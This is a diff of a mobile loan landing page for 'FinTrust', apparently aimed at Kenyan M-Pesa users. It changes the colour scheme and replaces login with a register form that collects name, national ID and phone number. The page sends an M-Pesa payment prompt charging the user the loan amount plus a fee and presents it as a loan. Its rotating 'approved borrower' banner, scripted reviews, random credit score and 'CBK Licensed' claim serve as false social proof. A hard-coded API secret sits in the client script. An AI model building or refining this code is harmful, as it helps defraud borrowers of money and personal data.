@@ -16,18 +16,18 @@
         body {
             font-family: 'Inter', sans-serif;
             background: #EFF2F5;
-            color: #1A2C3A;
+            color: #1A2C3C;
             line-height: 1.5;
         }
 
-        /* Elegant Background Pattern - Warm Tones */
+        /* Elegant Background Pattern */
         .bg-pattern {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(145deg, #F5E6D3 0%, #E8D4BC 50%, #F0E2D0 100%);
+            background: linear-gradient(145deg, #F5F7FA 0%, #EDF2F7 100%);
             z-index: -2;
         }
         
@@ -38,9 +38,9 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" opacity="0.08"><path fill="%23997B59" d="M100,30 L120,50 L100,70 L80,50 L100,30 Z M150,80 L170,100 L150,120 L130,100 L150,80 Z M50,80 L70,100 L50,120 L30,100 L50,80 Z M100,130 L120,150 L100,170 L80,150 L100,130 Z"/><circle cx="40" cy="40" r="3" fill="%23997B59"/><circle cx="160" cy="60" r="3" fill="%23997B59"/><circle cx="180" cy="140" r="2" fill="%23997B59"/><circle cx="20" cy="170" r="2" fill="%23997B59"/></svg>');
+            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" opacity="0.03"><path fill="%233B82F6" d="M100,30 L120,50 L100,70 L80,50 L100,30 Z M150,80 L170,100 L150,120 L130,100 L150,80 Z M50,80 L70,100 L50,120 L30,100 L50,80 Z M100,130 L120,150 L100,170 L80,150 L100,130 Z"/></svg>');
             background-repeat: repeat;
-            background-size: 40px;
+            background-size: 45px;
             pointer-events: none;
         }
 
@@ -52,25 +52,25 @@
             position: relative;
         }
 
-        /* Premium Card Design - Clean White with Shadow */
+        /* Premium Card Design */
         .card {
             background: rgba(255, 255, 255, 0.98);
             border-radius: 28px;
             padding: 1.5rem;
             margin: 1rem 1rem 1.2rem 1rem;
-            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(59, 130, 246, 0.15);
         }
 
-        /* Hero Section - Warm Burgundy/Brown Tones */
-.hero-gradient {
-    background: linear-gradient(135deg, #5F7A5C 0%, #8AAA7A 50%, #6E8B64 100%);
-    color: white;
-    border-radius: 0 0 2rem 2rem;
-    padding: 1.8rem 1.5rem 1.6rem;
-    position: relative;
-    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
-}
+        /* Hero Section - Elegant Navy Blue */
+        .hero-gradient {
+            background: linear-gradient(135deg, #1E3A5F 0%, #2C5F8A 50%, #1A4A6F 100%);
+            color: white;
+            border-radius: 0 0 2rem 2rem;
+            padding: 1.8rem 1.5rem 1.6rem;
+            position: relative;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+        }
 
         .hero-gradient h1 {
             font-size: 1.8rem;
@@ -86,8 +86,8 @@
 
         /* Premium Badge */
         .badge-offer {
-            background: #E6B17E;
-            color: #5A3A1F;
+            background: #F5A623;
+            color: #1E3A5F;
             border-radius: 60px;
             padding: 0.35rem 1rem;
             font-weight: 700;
@@ -97,7 +97,7 @@
 
         /* Buttons */
         .btn-primary {
-            background: #B56A3A;
+            background: #2C5F8A;
             color: white;
             border: none;
             width: 100%;
@@ -111,7 +111,7 @@
         }
 
         .btn-primary:hover:not(:disabled) {
-            background: #9B5A2F;
+            background: #1E3A5F;
             transform: translateY(-1px);
         }
 
@@ -120,30 +120,18 @@
             cursor: not-allowed;
         }
 
-        /* Live Activity Banner - Sleek, Light, with Opacity */
+        /* Live Activity Banner */
         .live-activity-card {
-            background: rgba(255, 248, 240, 0.92);
+            background: rgba(255, 255, 255, 0.95);
             backdrop-filter: blur(8px);
             border-radius: 20px;
             padding: 0.8rem 1rem;
             margin: 1rem 1rem 0 1rem;
-            border: 1px solid rgba(181, 106, 58, 0.25);
+            border: 1px solid rgba(44, 95, 138, 0.25);
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
             position: sticky;
             top: 0;
             z-index: 10;
-            transition: all 0.3s ease;
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
 
         .activity-header {
@@ -152,13 +140,13 @@
             gap: 6px;
             margin-bottom: 8px;
             padding-bottom: 6px;
-            border-bottom: 1px solid rgba(181, 106, 58, 0.2);
+            border-bottom: 1px solid rgba(44, 95, 138, 0.2);
         }
 
         .live-dot {
             width: 6px;
             height: 6px;
-            background: #B56A3A;
+            background: #2C5F8A;
             border-radius: 50%;
             animation: pulse 1.2s infinite;
         }
@@ -171,18 +159,18 @@
         .activity-title {
             font-size: 0.65rem;
             font-weight: 600;
-            color: #B56A3A;
+            color: #2C5F8A;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
         .activity-badge {
             margin-left: auto;
-            background: rgba(181, 106, 58, 0.12);
+            background: rgba(44, 95, 138, 0.1);
             padding: 3px 8px;
             border-radius: 20px;
             font-size: 0.55rem;
-            color: #B56A3A;
+            color: #2C5F8A;
         }
 
         .rotating-person {
@@ -207,7 +195,7 @@
         .person-icon {
             width: 42px;
             height: 42px;
-            background: linear-gradient(135deg, #B56A3A, #D48A54);
+            background: linear-gradient(135deg, #2C5F8A, #1E3A5F);
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -225,12 +213,12 @@
         .person-name {
             font-weight: 700;
             font-size: 0.85rem;
-            color: #4A3728;
+            color: #2C3E50;
         }
 
         .person-phone {
             font-size: 0.6rem;
-            color: #9B7A5F;
+            color: #6B8DA8;
             font-family: monospace;
             margin-top: 2px;
         }
@@ -238,17 +226,17 @@
         .person-amount {
             font-weight: 800;
             font-size: 1rem;
-            color: #B56A3A;
+            color: #2C5F8A;
         }
 
         .person-time {
             font-size: 0.55rem;
-            color: #9B7A5F;
+            color: #8AA9C4;
             text-align: right;
         }
 
         .approval-check {
-            color: #B56A3A;
+            color: #2C5F8A;
             font-size: 0.6rem;
             margin-top: 3px;
             display: flex;
@@ -266,7 +254,7 @@
             font-size: 0.7rem;
             display: block;
             margin-bottom: 6px;
-            color: #7A5A3F;
+            color: #4A627A;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
@@ -275,7 +263,7 @@
             width: 100%;
             padding: 0.85rem 1rem;
             border-radius: 14px;
-            border: 1.5px solid #E8DDD0;
+            border: 1.5px solid #E2E8F0;
             font-family: inherit;
             font-size: 0.9rem;
             background: #FFFFFF;
@@ -285,8 +273,8 @@
 
         input:focus, select:focus {
             outline: none;
-            border-color: #B56A3A;
-            box-shadow: 0 0 0 3px rgba(181, 106, 58, 0.1);
+            border-color: #2C5F8A;
+            box-shadow: 0 0 0 3px rgba(44, 95, 138, 0.1);
         }
 
         /* Features Grid */
@@ -298,16 +286,16 @@
         }
 
         .feature-card {
-            background: #FEFAF5;
+            background: #F8FAFE;
             padding: 1rem;
             border-radius: 18px;
             text-align: center;
-            border: 1px solid #F0E4D8;
+            border: 1px solid #E2E8F0;
         }
 
         .feature-card i {
             font-size: 1.4rem;
-            color: #B56A3A;
+            color: #2C5F8A;
             margin-bottom: 8px;
             display: block;
         }
@@ -315,45 +303,23 @@
         .feature-card h4 {
             font-size: 0.8rem;
             font-weight: 700;
-            color: #4A3728;
+            color: #2C3E50;
             margin-bottom: 4px;
         }
 
         .feature-card p {
             font-size: 0.65rem;
-            color: #8B6B4C;
+            color: #6B8DA8;
         }
 
-        /* Auth Tabs */
-        .auth-tabs {
-            display: flex;
-            gap: 12px;
-            background: #FEFAF5;
-            border-radius: 60px;
-            padding: 6px;
-            margin-bottom: 1.8rem;
-        }
-
-        .auth-tab {
-            flex: 1;
-            text-align: center;
-            padding: 0.7rem;
-            border-radius: 50px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            color: #8B6B4C;
-            font-size: 0.85rem;
-        }
-
-        .auth-tab.active {
-            background: #B56A3A;
-            color: white;
+        /* Register Form */
+        .register-container {
+            margin-top: 0;
         }
 
         /* Eligibility Container */
         .eligibility-container {
-            background: #FEFAF5;
+            background: #F8FAFE;
             border-radius: 20px;
             padding: 1.5rem;
             margin: 1rem 0;
@@ -368,44 +334,44 @@
             background: #FFFFFF;
             border-radius: 14px;
             transition: all 0.3s;
-            border: 1px solid #F0E4D8;
+            border: 1px solid #E2E8F0;
         }
 
         .eligibility-step.completed {
-            background: #F9F0E8;
-            border-left: 3px solid #B56A3A;
+            background: #EFF5FF;
+            border-left: 3px solid #2C5F8A;
         }
 
         .eligibility-step.active {
-            background: #FFF5EC;
-            border-left: 3px solid #E6B17E;
+            background: #F0F7FF;
+            border-left: 3px solid #F5A623;
         }
 
         .step-icon {
             width: 34px;
             height: 34px;
-            background: #F0E4D8;
+            background: #E2E8F0;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
             font-size: 0.85rem;
-            color: #8B6B4C;
+            color: #4A627A;
         }
 
         .eligibility-step.completed .step-icon {
-            background: #B56A3A;
+            background: #2C5F8A;
             color: white;
         }
 
         .eligibility-step.active .step-icon {
-            background: #E6B17E;
-            color: #5A3A1F;
+            background: #F5A623;
+            color: #2C3E50;
         }
 
         .progress-bar-container {
-            background: #F0E4D8;
+            background: #E2E8F0;
             border-radius: 10px;
             height: 5px;
             margin: 1rem 0;
@@ -413,7 +379,7 @@
         }
 
         .progress-bar {
-            background: #B56A3A;
+            background: #2C5F8A;
             height: 100%;
             width: 0%;
             transition: width 0.5s ease;
@@ -423,7 +389,7 @@
             width: 90px;
             height: 90px;
             border-radius: 50%;
-            background: conic-gradient(#B56A3A 0deg, #F0E4D8 0deg);
+            background: conic-gradient(#2C5F8A 0deg, #E2E8F0 0deg);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -444,7 +410,7 @@
         .score-value {
             font-size: 1.6rem;
             font-weight: 800;
-            color: #E6B17E;
+            color: #F5A623;
         }
 
         .eligibility-result {
@@ -452,7 +418,7 @@
             border-radius: 16px;
             padding: 1rem;
             margin-top: 1rem;
-            border-left: 4px solid #B56A3A;
+            border-left: 4px solid #2C5F8A;
         }
 
         /* Loan Cards */
@@ -468,46 +434,46 @@
             border-radius: 14px;
             padding: 0.9rem 0.6rem;
             text-align: center;
-            border: 1px solid #F0E4D8;
+            border: 1px solid #E2E8F0;
             cursor: pointer;
             transition: all 0.2s;
         }
 
         .loan-card.hot {
-            background: #FFF5EC;
-            border-left: 3px solid #E6B17E;
+            background: #FFF9E8;
+            border-left: 3px solid #F5A623;
         }
 
         .loan-card.selected {
-            border: 2px solid #B56A3A;
-            background: #FEFAF5;
+            border: 2px solid #2C5F8A;
+            background: #F0F7FF;
         }
 
         .loan-amount {
             font-size: 1.1rem;
             font-weight: 800;
-            color: #B56A3A;
+            color: #2C5F8A;
         }
 
         .loan-fee {
             font-size: 0.65rem;
-            color: #8B6B4C;
+            color: #6B8DA8;
             margin-top: 4px;
         }
 
         .hot-badge {
-            background: #E6B17E;
+            background: #F5A623;
             display: inline-block;
             font-size: 0.5rem;
             padding: 2px 8px;
             border-radius: 20px;
             font-weight: 700;
-            color: #5A3A1F;
+            color: #2C3E50;
             margin-top: 5px;
         }
 
         .stk-status {
-            background: #FEFAF5;
+            background: #F8FAFE;
             border-radius: 14px;
             padding: 1rem;
             margin-top: 1rem;
@@ -519,7 +485,7 @@
         }
 
         .back-link {
-            color: #B56A3A;
+            color: #2C5F8A;
             font-weight: 600;
             font-size: 0.75rem;
             background: none;
@@ -541,13 +507,13 @@
             display: flex;
             gap: 10px;
             padding: 0.8rem;
-            border-bottom: 1px solid #F0E4D8;
+            border-bottom: 1px solid #E2E8F0;
         }
 
         .comment-avatar {
             width: 40px;
             height: 40px;
-            background: #B56A3A;
+            background: #2C5F8A;
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -564,23 +530,23 @@
 
         .comment-name {
             font-weight: 700;
-            color: #4A3728;
+            color: #2C3E50;
             font-size: 0.8rem;
         }
 
         .comment-date {
             font-size: 0.55rem;
-            color: #B89A7A;
+            color: #8AA9C4;
         }
 
         .comment-text {
             font-size: 0.7rem;
-            color: #7A5A3F;
+            color: #4A627A;
             margin-top: 4px;
         }
 
         .comment-rating {
-            color: #E6B17E;
+            color: #F5A623;
             font-size: 0.65rem;
             margin-top: 3px;
         }
@@ -591,7 +557,7 @@
             gap: 10px;
             margin: 0.6rem 0;
             padding: 0.6rem;
-            background: #FEFAF5;
+            background: #F8FAFE;
             border-radius: 12px;
             font-size: 0.75rem;
         }
@@ -599,7 +565,7 @@
         .step-number {
             width: 26px;
             height: 26px;
-            background: #B56A3A;
+            background: #2C5F8A;
             color: white;
             border-radius: 50%;
             display: inline-flex;
@@ -614,7 +580,7 @@
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
-            background: #4A3728;
+            background: #2C3E50;
             color: white;
             padding: 10px 18px;
             border-radius: 50px;
@@ -638,12 +604,12 @@
 
         .success-icon {
             font-size: 1.5rem;
-            color: #B56A3A;
+            color: #2C5F8A;
             text-align: center;
         }
 
         .error-message {
-            color: #E6B17E;
+            color: #F5A623;
             font-size: 0.65rem;
             margin-top: 6px;
         }
@@ -651,7 +617,7 @@
         .section-title {
             font-size: 0.85rem;
             font-weight: 700;
-            color: #B56A3A;
+            color: #2C5F8A;
             margin-bottom: 0.8rem;
             display: flex;
             align-items: center;
@@ -668,12 +634,12 @@
         .consent-row input {
             width: 16px;
             height: 16px;
-            accent-color: #B56A3A;
+            accent-color: #2C5F8A;
         }
 
         .consent-row label {
             font-size: 0.7rem;
-            color: #7A5A3F;
+            color: #4A627A;
             margin: 0;
             text-transform: none;
         }
@@ -691,7 +657,7 @@
             <div style="margin-top: 12px;"><span class="badge-offer">Special Offer: 7.8% Interest</span></div>
         </div>
         
-        <!-- Live Activity Banner - Persistent, Light, with Opacity -->
+        <!-- Live Activity Banner -->
         <div class="live-activity-card" id="liveActivityCard">
             <div class="activity-header">
                 <div class="live-dot"></div>
@@ -703,9 +669,9 @@
         
         <!-- Special Offer Card -->
         <div class="card">
-            <h3 style="color: #B56A3A; margin-bottom: 8px;">Special Offer</h3>
-            <p style="font-size: 1rem; font-weight: 700;">Get Your Loan with <span style="color: #E6B17E;">7.8% Interest</span></p>
-            <p style="font-size: 0.7rem; color: #7A5A3F; margin-bottom: 1rem;">For Qualified Borrowers</p>
+            <h3 style="color: #2C5F8A; margin-bottom: 8px;">Special Offer</h3>
+            <p style="font-size: 1rem; font-weight: 700;">Get Your Loan with <span style="color: #F5A623;">7.8% Interest</span></p>
+            <p style="font-size: 0.7rem; color: #4A627A; margin-bottom: 1rem;">For Qualified Borrowers</p>
             <div class="consent-row">
                 <input type="checkbox" id="consentLanding">
                 <label for="consentLanding">I consent to receive updates and acknowledge the Terms and Conditions.</label>
@@ -715,8 +681,8 @@
 
         <!-- Why Choose Us Section -->
         <div class="card">
-            <h3 style="margin-bottom: 0.6rem; color: #B56A3A;">Why Choose Us</h3>
-            <p style="font-size: 0.75rem; color: #7A5A3F; margin-bottom: 1rem;">We're changing the way Kenyans access quick loans with a customer-first approach</p>
+            <h3 style="margin-bottom: 0.6rem; color: #2C5F8A;">Why Choose Us</h3>
+            <p style="font-size: 0.75rem; color: #4A627A; margin-bottom: 1rem;">We're changing the way Kenyans access quick loans with a customer-first approach</p>
             <div class="features-grid">
                 <div class="feature-card">
                     <i class="fas fa-bolt"></i>
@@ -743,45 +709,35 @@
 
         <!-- Comments Section -->
         <div class="card">
-            <div class="section-title"><i class="fas fa-star" style="color: #E6B17E;"></i> Customer Reviews</div>
+            <div class="section-title"><i class="fas fa-star" style="color: #F5A623;"></i> Customer Reviews</div>
             <div class="comments-section" id="commentsSection"></div>
         </div>
         
-        <div class="card" style="text-align: center; font-size: 0.6rem; color: #B89A7A;">CBK Licensed | Regulated by Central Bank of Kenya</div>
+        <div class="card" style="text-align: center; font-size: 0.6rem; color: #8AA9C4;">CBK Licensed | Regulated by Central Bank of Kenya</div>
     </div>
 
-    <!-- PAGE 2: LOGIN / REGISTER -->
-    <div id="authPage" class="hidden">
+    <!-- PAGE 2: REGISTER ONLY -->
+    <div id="registerPage" class="hidden">
         <div class="hero-gradient" style="padding: 1.2rem;">
-            <i class="fas fa-university" style="font-size: 1.4rem;"></i>
-            <h3 style="margin-top: 6px; font-size: 1.2rem;">Customer Portal</h3>
-            <p style="font-size: 0.65rem;">Login or create an account</p>
+            <i class="fas fa-user-plus" style="font-size: 1.4rem;"></i>
+            <h3 style="margin-top: 6px; font-size: 1.2rem;">Create Account</h3>
+            <p style="font-size: 0.65rem;">Register to access instant loans</p>
         </div>
         <div class="card">
-            <div class="auth-tabs" id="authTabs">
-                <div class="auth-tab active" data-mode="login">Login</div>
-                <div class="auth-tab" data-mode="register">Register</div>
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="regFullName" placeholder="John Kamau">
             </div>
-            <div id="loginForm">
-                <div class="form-group">
-                    <label>M-Pesa Number</label>
-                    <input type="tel" id="loginPhone" placeholder="07XX XXX XXX">
-                </div>
-                <div class="form-group">
-                    <label>PIN</label>
-                    <input type="password" id="loginPassword" placeholder="4-digit PIN">
-                </div>
-                <button class="btn-primary" id="doLoginBtn">Login & Check Eligibility</button>
-                <div id="loginErrorMsg" class="error-message" style="margin-top: 10px; text-align: center;"></div>
+            <div class="form-group">
+                <label>ID Number</label>
+                <input type="text" id="regIdNumber" placeholder="34567890">
             </div>
-            <div id="registerForm" class="hidden">
-                <div class="form-group"><label>Full Name</label><input type="text" id="regFullName" placeholder="John Kamau"></div>
-                <div class="form-group"><label>ID Number</label><input type="text" id="regIdNumber" placeholder="34567890"></div>
-                <div class="form-group"><label>M-Pesa Number</label><input type="tel" id="regPhone" placeholder="07XX XXX XXX"></div>
-                <div class="form-group"><label>Create 4-digit PIN</label><input type="password" id="regPin" maxlength="4" placeholder="****"></div>
-                <button class="btn-primary" id="doRegisterBtn">Create Account</button>
+            <div class="form-group">
+                <label>M-Pesa Number</label>
+                <input type="tel" id="regPhone" placeholder="07XX XXX XXX">
             </div>
-            <button class="back-link" id="backToLandingAuth"><i class="fas fa-arrow-left"></i> Back to Home</button>
+            <button class="btn-primary" id="doRegisterBtn">Create Account & Continue</button>
+            <button class="back-link" id="backToLandingReg"><i class="fas fa-arrow-left"></i> Back to Home</button>
         </div>
     </div>
 
@@ -829,7 +785,7 @@
                 </div>
                 <div id="eligibilityResultBox" class="hidden"></div>
             </div>
-            <button class="back-link" id="backToAuthFromEligibility"><i class="fas fa-user-edit"></i> Change account</button>
+            <button class="back-link" id="backToRegFromEligibility"><i class="fas fa-user-edit"></i> Change account</button>
         </div>
     </div>
 
@@ -861,8 +817,9 @@
 </div>
 
 <script>
+    // NestLink API Configuration
     const API_ENDPOINT = 'https://api.nestlink.co.ke/runPrompt';
-    const API_SECRET = '8b8cf12992d2b40be762104f';
+    const API_SECRET = '952267f437d0762cc7190870';
     
     const LOAN_PRODUCTS = [
         { amount: 7100, fee: 100, hot: false }, { amount: 8050, fee: 120, hot: false },
@@ -901,14 +858,14 @@
     function showToast(message, isError = false) {
         const toast = document.createElement('div');
         toast.className = 'notification-toast';
-        toast.style.background = isError ? '#B56A3A' : '#4A3728';
+        toast.style.background = isError ? '#E74C3C' : '#2C5F8A';
         toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-circle' : 'fa-check-circle'}"></i> ${message}`;
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 4000);
     }
     
     function showPage(pageId) {
-        ['landingPage', 'authPage', 'eligibilityPage', 'loanOffersPage'].forEach(id => {
+        ['landingPage', 'registerPage', 'eligibilityPage', 'loanOffersPage'].forEach(id => {
             document.getElementById(id).classList.add('hidden');
         });
         document.getElementById(pageId).classList.remove('hidden');
@@ -917,7 +874,6 @@
     function updateRotatingPerson() {
         const container = document.getElementById('rotatingPersonContainer');
         if (!container) return;
-        
         const person = ROTATING_PEOPLE[rotatingIndex];
         container.innerHTML = `
             <div class="rotating-person">
@@ -933,7 +889,6 @@
                 </div>
             </div>
         `;
-        
         rotatingIndex = (rotatingIndex + 1) % ROTATING_PEOPLE.length;
     }
     
@@ -942,6 +897,17 @@
     function validatePhone(phone) {
         const cleaned = phone.replace(/\D/g, '');
         return cleaned.match(/^(07|01)[0-9]{8}$/) || cleaned.match(/^2547[0-9]{8}$/);
+    }
+    
+    function formatPhoneForAPI(phone) {
+        let formatted = phone.replace(/\D/g, '');
+        if (formatted.startsWith('0')) {
+            formatted = '254' + formatted.substring(1);
+        }
+        if (!formatted.startsWith('254')) {
+            formatted = '254' + formatted;
+        }
+        return formatted;
     }
     
     function loadComments() {
@@ -991,7 +957,7 @@
         const scoreValue = document.getElementById('scoreValue');
         const scoreCircle = document.getElementById('scoreCircle');
         const angle = (score / 100) * 360;
-        scoreCircle.style.background = `conic-gradient(#B56A3A ${angle}deg, #F0E4D8 ${angle}deg)`;
+        scoreCircle.style.background = `conic-gradient(#2C5F8A ${angle}deg, #E2E8F0 ${angle}deg)`;
         scoreValue.textContent = score;
         creditScoreDisplay.classList.remove('hidden');
         
@@ -1020,8 +986,8 @@
         if (passed) {
             resultBox.innerHTML = `
                 <div class="eligibility-result">
-                    <i class="fas fa-check-circle" style="color: #B56A3A; font-size: 1.3rem;"></i>
-                    <h4 style="margin: 6px 0; color: #B56A3A;">Eligibility Confirmed</h4>
+                    <i class="fas fa-check-circle" style="color: #2C5F8A; font-size: 1.3rem;"></i>
+                    <h4 style="margin: 6px 0; color: #2C5F8A;">Eligibility Confirmed</h4>
                     <p style="font-size:0.8rem"><strong>Credit Score:</strong> ${score}/100</p>
                     <p style="font-size:0.8rem"><strong>Maximum Loan Limit:</strong> KES ${userMaxLimit.toLocaleString()}</p>
                     <p style="font-size: 0.7rem;">You qualify for ${eligible.length} loan options</p>
@@ -1035,7 +1001,7 @@
         } else {
             resultBox.innerHTML = `
                 <div class="eligibility-result">
-                    <i class="fas fa-times-circle" style="color: #E6B17E; font-size: 1.3rem;"></i>
+                    <i class="fas fa-times-circle" style="color: #F5A623; font-size: 1.3rem;"></i>
                     <h4 style="margin: 6px 0;">Not Eligible at this time</h4>
                     <p>Score: ${score}/100 | Limit: KES ${userMaxLimit.toLocaleString()}</p>
                     <p style="font-size: 0.7rem;">Build your M-Pesa transaction history and try again.</p>
@@ -1063,52 +1029,47 @@
         });
     }
     
-    async function sendStkPush(phone, amount, fee) {
-        const total = amount + fee;
-        let formattedPhone = phone.replace(/\D/g, '');
-        if (formattedPhone.startsWith('0')) formattedPhone = '254' + formattedPhone.substring(1);
-        if (!formattedPhone.startsWith('254')) formattedPhone = '254' + formattedPhone;
+    async function sendStkPush(phone, amount, fee, localId) {
+        const totalAmount = amount + fee;
+        const formattedPhone = formatPhoneForAPI(phone);
+        
+        const payload = {
+            phone: formattedPhone,
+            amount: totalAmount,
+            local_id: localId,
+            transaction_desc: `FinTrust Loan: KES ${amount} + fee ${fee}`
+        };
         
         const response = await fetch(API_ENDPOINT, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${API_SECRET}` },
-            body: JSON.stringify({
-                phone: formattedPhone,
-                amount: total,
-                reference: `FTR-${Date.now()}`,
-                description: `FinTrust Loan: KES ${amount} + fee ${fee}`
-            })
+            headers: { 
+                'Content-Type': 'application/json',
+                'Api-Secret': API_SECRET
+            },
+            body: JSON.stringify(payload)
         });
-        if (!response.ok) throw new Error(`API Error: ${response.status}`);
-        return await response.json();
-    }
-    
-    function handleLogin() {
-        const phone = document.getElementById('loginPhone').value.trim();
-        const pin = document.getElementById('loginPassword').value.trim();
-        const errorDiv = document.getElementById('loginErrorMsg');
-        if (!phone || !pin) { errorDiv.innerText = 'Enter phone and PIN'; return; }
-        if (!validatePhone(phone)) { errorDiv.innerText = 'Enter valid M-Pesa number (07XX XXX XXX)'; return; }
-        const storedUser = registeredUsers[phone];
-        if (!storedUser || storedUser.pin !== pin) { errorDiv.innerText = 'Invalid credentials. Please register.'; return; }
-        currentUser = { ...storedUser, phone: phone, isRegistered: true };
-        document.getElementById('eligPhoneDisplay').innerHTML = `<i class="fas fa-phone"></i> ${phone}`;
-        showPage('eligibilityPage');
-        runEligibilityCheck(phone);
+        
+        if (!response.ok) {
+            const errorData = await response.text();
+            throw new Error(`API Error: ${response.status} - ${errorData}`);
+        }
+        
+        const result = await response.json();
+        return result;
     }
     
     function handleRegister() {
         const full = document.getElementById('regFullName').value.trim();
         const idNum = document.getElementById('regIdNumber').value.trim();
         const phone = document.getElementById('regPhone').value.trim();
-        const pin = document.getElementById('regPin').value.trim();
-        if (!full || !idNum || !phone || !pin) { showToast('Fill all fields', true); return; }
+        
+        if (!full || !idNum || !phone) { showToast('Fill all fields', true); return; }
         if (!validatePhone(phone)) { showToast('Enter valid M-Pesa number (07XX XXX XXX)', true); return; }
-        if (pin.length !== 4 || isNaN(pin)) { showToast('PIN must be 4 digits', true); return; }
-        if (registeredUsers[phone]) { showToast('Phone already registered. Please login.', true); return; }
-        registeredUsers[phone] = { fullName: full, idNumber: idNum, pin: pin };
+        
+        registeredUsers[phone] = { fullName: full, idNumber: idNum };
         localStorage.setItem('fintrustUsers', JSON.stringify(registeredUsers));
-        currentUser = { fullName: full, idNumber: idNum, phone: phone, pin: pin, isRegistered: true };
+        currentUser = { fullName: full, idNumber: idNum, phone: phone, isRegistered: true };
+        
         document.getElementById('eligPhoneDisplay').innerHTML = `<i class="fas fa-phone"></i> ${phone}`;
         showPage('eligibilityPage');
         runEligibilityCheck(phone);
@@ -1116,41 +1077,57 @@
     
     async function onRequestStk() {
         if (!selectedLoan) { showToast('Please select a loan amount', true); return; }
-        if (!currentUser) { showToast('Session expired', true); showPage('authPage'); return; }
+        if (!currentUser) { showToast('Session expired', true); showPage('registerPage'); return; }
+        
         const responseArea = document.getElementById('stkResponseArea');
         const btn = document.getElementById('requestStkBtn');
         responseArea.classList.remove('hidden');
-        responseArea.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending STK Push request...';
+        responseArea.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending STK Push request to M-Pesa...';
         btn.disabled = true;
+        
+        const localId = `FTR-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`;
+        
         try {
-            await sendStkPush(currentUser.phone, selectedLoan.amount, selectedLoan.fee);
-            responseArea.innerHTML = `<div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                <strong>STK Push Sent!</strong><br>Check your phone (${currentUser.phone}) for the M-Pesa prompt.<br>
-                Enter your PIN to complete.<br>
-                <small>KES ${selectedLoan.amount.toLocaleString()} + fee KES ${selectedLoan.fee}</small>`;
-            showToast(`STK Push sent to ${currentUser.phone}`);
+            const result = await sendStkPush(currentUser.phone, selectedLoan.amount, selectedLoan.fee, localId);
+            
+            if (result.status === true || result.headers === 200) {
+                responseArea.innerHTML = `
+                    <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                    <strong>STK Push Sent Successfully!</strong><br>
+                    Check your phone (${currentUser.phone}) for the M-Pesa prompt.<br>
+                    Enter your PIN to complete the transaction.<br>
+                    <small>Loan: KES ${selectedLoan.amount.toLocaleString()} + Fee: KES ${selectedLoan.fee}<br>
+                    Total: KES ${(selectedLoan.amount + selectedLoan.fee).toLocaleString()}</small>
+                    <div style="margin-top: 8px; font-size: 0.7rem; color: #6B8DA8;">
+                        <i class="fas fa-clock"></i> Transaction ID: ${result.data?.CheckoutRequestID || 'Processing'}
+                    </div>
+                `;
+                responseArea.style.background = "#E8F5E9";
+                showToast(`STK Push sent to ${currentUser.phone}. Enter PIN on your phone.`);
+            } else {
+                throw new Error(result.msg || 'Payment request failed');
+            }
         } catch (err) {
-            responseArea.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Failed: ${err.message}`;
+            console.error('STK Push Error:', err);
+            responseArea.innerHTML = `
+                <i class="fas fa-exclamation-triangle" style="color: #E74C3C; font-size: 1.2rem;"></i>
+                <strong>STK Push Failed</strong><br>
+                ${err.message}<br>
+                <small>Please try again or contact support.</small>
+            `;
+            responseArea.style.background = "#FFEBEE";
             showToast(err.message, true);
-        } finally { btn.disabled = false; }
+        } finally { 
+            btn.disabled = false;
+        }
     }
     
-    document.getElementById('startBtn').onclick = () => { if(document.getElementById('consentLanding').checked) showPage('authPage'); else showToast('Please accept Terms', true); };
-    document.getElementById('backToLandingAuth').onclick = () => showPage('landingPage');
-    document.getElementById('backToAuthFromEligibility').onclick = () => showPage('authPage');
+    document.getElementById('startBtn').onclick = () => { if(document.getElementById('consentLanding').checked) showPage('registerPage'); else showToast('Please accept Terms', true); };
+    document.getElementById('backToLandingReg').onclick = () => showPage('landingPage');
+    document.getElementById('backToRegFromEligibility').onclick = () => showPage('registerPage');
     document.getElementById('backToEligibilityFromOffers').onclick = () => { selectedLoan = null; showPage('eligibilityPage'); };
-    document.getElementById('doLoginBtn').onclick = handleLogin;
     document.getElementById('doRegisterBtn').onclick = handleRegister;
     document.getElementById('requestStkBtn').onclick = onRequestStk;
-    
-    document.querySelectorAll('.auth-tab').forEach(tab => {
-        tab.onclick = () => {
-            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
-            tab.classList.add('active');
-            document.getElementById('loginForm').classList.toggle('hidden', tab.dataset.mode === 'register');
-            document.getElementById('registerForm').classList.toggle('hidden', tab.dataset.mode === 'login');
-        };
-    });
     
     loadComments();
     updateRotatingPerson();
